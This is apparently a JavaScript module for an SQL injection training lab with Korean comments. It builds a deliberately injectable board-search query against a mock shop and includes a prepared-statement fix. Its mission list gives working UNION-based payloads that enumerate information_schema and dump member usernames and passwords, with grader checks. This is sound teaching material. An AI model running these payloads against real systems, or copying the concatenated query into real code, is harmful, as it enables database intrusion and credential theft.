// Union SQL 인젝션: 게시판 검색어를 LIKE 조건에 그대로 이어 붙인 SQL
import { ADMIN, DB_NAME, DB_VERSION, POSTS } from './labDb.js';
import { cells, joinParts, runQuery } from './query.js';

export const SEARCH_URL = 'http://shop.lab/board/search.php';

export function searchUrl(q) {
  return `${SEARCH_URL}?q=${encodeURIComponent(q)}`;
}

/** 검색 SQL (컬럼 4개: id, title, writer, created). safe 이면 Prepared Statement */
export function searchQuery(q, { safe = false } = {}) {
  if (safe) {
    const parts = ['SELECT id, title, writer, created FROM posts WHERE title LIKE ? ORDER BY id DESC'];
    return { parts, sql: parts[0], params: [`%${q}%`] };
  }
  const parts = [
    "SELECT id, title, writer, created FROM posts WHERE title LIKE '%",
    { input: 'q', value: q },
    "%' ORDER BY id DESC",
  ];
  return { parts, sql: joinParts(parts), params: [] };
}

export function search(db, q, { safe = false } = {}) {
  const query = searchQuery(q, { safe });
  const r = runQuery(db, query.sql, query.params);
  return { ...query, ...r, safe, input: { q } };
}

/** 게시글이 아닌 행(UNION 으로 붙인 행)이 결과에 있는지 */
export function hasInjectedRows(attempt) {
  return attempt.rows.some(
    (row) => !POSTS.some((p) => p.id === row[0] && p.title === row[1] && p.writer === row[2]),
  );
}

const has = (attempt, value) => cells(attempt.rows).some((c) => c.includes(value));

export const UNION_MISSIONS = [
  {
    id: 'error',
    title: "작은따옴표로 SQL 오류를 일으켜 취약점 확인하기",
    hint: "검색어에 ' 를 넣으면 LIKE '%...%' 문자열이 깨져 문법 오류가 납니다.",
    example: "검색어: '",
    check: (a) => !a.safe && !!a.error,
  },
  {
    id: 'columns',
    title: '원래 SELECT 의 컬럼 수를 알아내고 UNION SELECT 로 행 붙이기',
    hint: 'ORDER BY 1, 2, 3 ... 처럼 번호를 늘리다 오류가 나는 지점, 또는 UNION SELECT 1, 2, ... 로 오류가 사라지는 개수를 찾습니다. 화면에 보이는 숫자 위치가 출력에 쓸 수 있는 칸입니다.',
    example: "검색어: ' ORDER BY 5 --   →   ' UNION SELECT 1, 2, 3, 4 --",
    check: (a) => !a.safe && !a.error && /\bunion\b/i.test(a.input.q) && hasInjectedRows(a),
  },
  {
    id: 'dbinfo',
    title: 'DB 이름과 버전 알아내기',
    hint: 'UNION SELECT 의 출력 칸에 database(), version() 같은 함수를 넣습니다.',
    example: "검색어: ' UNION SELECT 1, database(), version(), user() --",
    check: (a) => !a.safe && !a.error && (has(a, DB_NAME) || has(a, DB_VERSION)),
  },
  {
    id: 'tables',
    title: '회원 정보가 있는 테이블 이름 알아내기',
    hint: 'MySQL 은 information_schema.tables 에 테이블 목록이 있습니다. table_schema 를 database() 로 거르면 이 쇼핑몰의 테이블만 나옵니다.',
    example: "검색어: ' UNION SELECT 1, table_name, table_schema, 4 FROM information_schema.tables --",
    check: (a) => !a.safe && !a.error && cells(a.rows).includes('members'),
  },
  {
    id: 'columns-name',
    title: 'members 테이블의 컬럼 이름 알아내기',
    hint: 'information_schema.columns 에서 table_name 이 members 인 행의 column_name 을 출력합니다.',
    example: "검색어: ' UNION SELECT 1, column_name, data_type, 4 FROM information_schema.columns WHERE table_name = 'members' --",
    check: (a) => !a.safe && !a.error && cells(a.rows).includes('password') && cells(a.rows).includes('username'),
  },
  {
    id: 'dump',
    title: '관리자 비밀번호 알아내기',
    hint: '알아낸 테이블·컬럼 이름으로 members 의 username, password 를 출력 칸에 넣습니다.',
    example: "검색어: ' UNION SELECT id, username, password, role FROM members --",
    check: (a) => !a.safe && !a.error && has(a, ADMIN.password),
  },
  {
    id: 'safe',
    title: '보안 코딩(Prepared Statement)을 켜고 같은 공격이 막히는지 확인하기',
    hint: "'보안 코딩 적용'을 켜면 검색어 전체가 하나의 문자열 값으로 검색됩니다. 위에서 성공한 입력을 다시 넣어 보세요.",
    example: "보안 코딩 적용 → 검색어: ' UNION SELECT id, username, password, role FROM members --",
    check: (a) => a.safe && !a.error && /\bunion\b/i.test(a.input.q) && !hasInjectedRows(a),
  },
];
